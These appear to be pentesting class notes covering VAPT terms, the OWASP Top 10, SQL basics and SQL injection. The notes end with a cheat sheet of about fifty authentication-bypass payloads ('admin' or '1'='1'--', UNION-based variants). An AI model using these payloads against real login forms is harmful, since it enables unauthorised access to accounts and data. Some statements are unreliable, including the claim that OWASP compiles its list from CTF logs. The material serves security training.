@@ -1,0 +1,254 @@
+						Session  9
+
+Introduction to Vulnearbility Assessment and Penetration Testing
+-------------------------------------------------------------------
+
+What does this VAPT stands for :
+V --> Vulnerability : The LOOPHOLES ,security misconfigurations which 		can cause an attacker to get inside a network or website or in 		  other terms the ways which help an attacker to intrude in the 	  systems.
+A --> Assessment : It simply mean that analyzing the vulnerability and 		 scanning the vulnerability onto how much it could cause damage 	  to the victim.
+P --> Penetration : When you get the vulnerability and is accessed, a 		report is generated and through that further exploitation or 		  intrusion is done this is known as penetrtion .
+T --> Testing : When a person is penetrating it requires several 		  procedures or attacks to penetrate this is done thrugh this  		  testing phase. 
+
+
+Most of the scenario this whole process is carried out in two parts 
+VA and PT
+
+VA : Scanning of loopholes and weak security points. In this phase we just scan for the devices, web application, server, network, website and database.We don't penetrate in this phase.
+
+PT : To gain access into the scanned vulnerabilities. We just try to hack into the services, devices, web application, servers and databases via the scanned vulnerabilities.
+
+Several bug bounty programs :
+www.bugcrowd.com
+www.hackerone.com
+firebounty.com
+
+=======================================================================
+
+						OWASP TOP-10
+						============
+Open Web Application Security Project
+-------------------------------------
+	It is non-profit charitable organisation, which works towards the security of the web application. They gather the information from all around the globe. They gather the information through CTF initiative. 
+	They open challange the whole hacking community, to hack into the online system and capture the flag, in return, they will provide with the bounty. They gather the logs of the attacks which are performed in the CTF.
+	After gathering the whole logs, they perform the analysis of these logs and categorise the attacks accordingly.
+	They release a list of 10 attacks.
+	OWASP TOP 10. --> top 10 attacks.
+
+A1 -Injection
+A2 -Broken Authentication and Session Management
+A3 -Cross-Site Scripting (XSS)
+A4 -Insecure Direct Object References
+A5 -Security Misconfiguration
+A6 -Sensitive Data Exposure
+A7 -Missing Function Level Access Control
+A8 -Cross-Site Request Forgery (CSRF)
+A9 -Using Components with Known Vulnerabilities
+A10 -Unvalidated Redirects and Forwards
+
+OWASP 2013 --> Stable
+OWASP 2017 --> Data sufficient
+	https://www.owasp.org/images/7/72/OWASP_Top_10-2017_(en).pdf.pdf
+
+https://cybermap.kaspersky.com/
+https://www.fireeye.com/cyber-map/threat-map.html
+http://map.norsecorp.com/
+
+
+=====================================================================
+
+
+INTRODUCTION TO DBMS
+=====================
+
+Database
+========
+A database is something which stores the information (processed data).
+
+
+DBMS
+====
+DBMS stands for Database Management System .The DBMS manages the data and arrange it in an organized form i.e. in the form of tables. The DBMS can Create, Insert, Modify, Delete and perform other operations on the Tables and Columns the Database we are operating on. 
+
+Databases stores data in the Forms of Tables  --> Columns and Rows.
+
+Eg. Student RECORD 
+
+------------------------------------------------------------------
+Sno.| NAME | CLASS | CONTACT | ADDRESS 			| EMAIL   		 |
+1   |abhi  |  1    | 2260143 | JANAKPURI EAST   | ABH1@gmail.com |
+2	|Ben   |  1    | 1100192 | KALKAJI ext.		| ben@gmail.com  |
+------------------------------------------------------------------
+
+
+The above data is a structured data in the form of rows and columns.
+So in order to extract,alter or modify data from the above table we use some query and these queries are considered as STRUCTURED QUERIED LANGUAGE or
+SQL.
+
+-------------------------------------------------------------
+
+SQL BASICS
+========== 
+
+SQL is the language in which a Database can communicate by creating , modifying or inserting any type of data. Structured Query Language works on the basis of queries.
+
+Select * from table_name;
+
+Queries
+-------
+1. Insert
+=========
+    Insert into <table_name>(Columns_name) values(<Values to be inserted in Ddouble quotes>);
+ 
+    INSERT INTO `information` (`Name`, `Age`, `Gender`, `Address`) VALUES ('aman', '25', 'M', 'Vikram NAGAR');
+ 
+2. Select
+=========
+    Select * from <table_name>;
+ 
+    * ---> everything
+    Select * from information;
+ 
+3. Update
+=========
+    Update <table_name> set <value to be change> where <condition>;
+ 
+    UPDATE information set Age=30 WHERE Name="Aman"
+ 
+4. Where
+========
+    Condition clause
+    Select * from information where name like "A%"
+ 
+5. Delete
+=========
+    Delete from <table_name> where <condition>;
+ 
+    Delete from information where name="Aman"
+
+6. Create
+=========
+    create table <table_name>(Column_name data_type(length));
+ 
+    CREATE TABLE info(name text(30),salary int(6));
+
+ 
+7. Order By
+===========
+    Is used fir arranging data either in ascending order or in descending order.
+    select * from <table_name> order by name;
+    select * from staff order by age;
+ 
+8. group by
+===========
+    It is used for making a group
+ 
+    select * from table_name group by gender;
+ 
+9. Union
+========
+    Used fro combining data of two different tables. Column number in both the table must be equal.
+    null
+
+
+
+
+ 
+10. Information_schema
+======================
+    It is a meta tables which stores only meta data ---> only table names and column names, but it will not store the data inside the column name or table.
+ 
+    If I want to see only the table name ---> Information_schema.tables
+ 
+    If I want to see the column name --> Information_schema.columns
+ 
+Authentication Bypass
+=====================
+    1. Basic Authentication
+    2. Integrated Authentication
+    3. Digest Authentication
+    4. Form Based Authentication
+ 
+I will log in in the database as an administrator, with out having the credentials of the admin.
+ 
+Gates --> AND | OR
+ 
+Testing Payload --->    1'or'1'='1
+ 
+https://www.abc.com/items.php?id=2
+    Item name
+    Item Price
+ 
+Select item_name,item_price from items where username='1'or'2'='2'#
+Select item_name,item_price from items where id=3;
+ 
+Select item_name,item_price from items where id=2'
+ 
+    1'or'1'='1 ---> True
+    0'or'0'='0
+    x'or'x'='x
+
+
+    CHEAT SHEET for Authentication Bypass
+    
+ 
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+ 
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+
+
+
+
+
+
+
+http://testphp.vulnweb.com/
+http://demo.testfire.net/
+
+
+
+
